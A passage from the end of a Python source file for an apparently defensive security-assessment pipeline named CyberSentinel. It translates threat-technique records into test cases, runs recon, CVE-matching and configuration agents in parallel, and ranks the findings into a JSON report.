            tid = (t.get("id") or t.get("technique_id", "")) if isinstance(t, dict) else str(t)
            tname = t.get("name", tid) if isinstance(t, dict) else tid
            all_techs[tid] = tname
    for tid, tname in sorted(all_techs.items()):
        in_registry = "in registry" if tid in TECHNIQUE_REGISTRY else "NOT in registry"
        print(f"  {tid:15s} {tname:40s} [{in_registry}]")
    print(f"  Total unique techniques: {len(all_techs)}\n")

    # Stage 2 — Translate to test cases (fan-out)
    test_cases = translate_ttps_to_test_cases(records)
    if not test_cases:
        print("[CyberSentinel] No test cases generated — check ttp_records.json content")
        return

    # Stage 3 — Set up queues and run all 3 agents in parallel
    recon_q = asyncio.Queue()
    cve_q = asyncio.Queue()
    logic_q = asyncio.Queue()

    recon_results = []
    cve_results = []
    logic_results = []

    loop = asyncio.get_event_loop()

    print(f"[CyberSentinel] Starting 3 parallel agents on {len(test_cases)} test cases...\n")
    t_start = time.time()

    # Run fan-out first, then all 3 agents concurrently
    # Each agent processes its queue items concurrently using semaphore (max 2 parallel Ollama calls per agent)
    await fan_out(test_cases, recon_q, cve_q, logic_q)
    await asyncio.gather(
        recon_agent(recon_q, recon_results, loop),
        cve_match_agent(cve_q, cve_results, loop),
        logic_config_agent(logic_q, logic_results, loop),
    )

    elapsed = round(time.time() - t_start, 1)
    print(f"\n[CyberSentinel] All agents complete in {elapsed}s")
    print(f"  Recon findings:  {len(recon_results)}")
    print(f"  CVE findings:    {len(cve_results)}")
    print(f"  Config findings: {len(logic_results)}")

    # Stage 4 — Orchestrate: dedup + score + rank
    print("\n[CyberSentinel] Orchestrating and scoring findings...")
    findings = orchestrate(recon_results, cve_results, logic_results)

    # Stage 5 — Generate report
    report = generate_report(findings, report_path)
    print(f"[CyberSentinel] Pipeline complete. {len(findings)} ranked findings.")
    return report


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    ttp_path = sys.argv[1] if len(sys.argv) > 1 else "ttp_records.json"
    report_path = sys.argv[2] if len(sys.argv) > 2 else "cybersentinel_report.json"

    asyncio.run(run_pipeline(ttp_path, report_path))
